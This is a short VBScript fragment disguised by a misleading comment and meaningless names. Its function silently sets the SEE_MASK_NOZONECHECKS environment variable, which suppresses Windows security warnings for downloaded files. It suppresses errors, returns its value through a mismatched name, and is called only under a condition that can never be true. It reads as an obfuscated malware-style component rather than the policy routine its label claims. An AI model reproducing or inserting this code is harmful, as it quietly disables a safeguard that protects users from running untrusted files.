' --- Reconcile staged policy block ---
Function DecodeManifest9()
On Error Resume Next
  Dim blnValid25,blnValid64,strSegment21
  Set blnValid25=CreateObject("WScript.Shell")
  blnValid64=blnValid25.ExpandEnvironmentStrings("%TEMP%")
  strSegment21=blnValid25.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnValid64)>0 And Len(strSegment21)>0 Then
    blnValid25.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    LoadProfileSegment55=1
    Exit Function
  End If
  LoadProfileSegment55=0
End Function

If Timer() < 0 Then
  Call DecodeManifest9()
End If


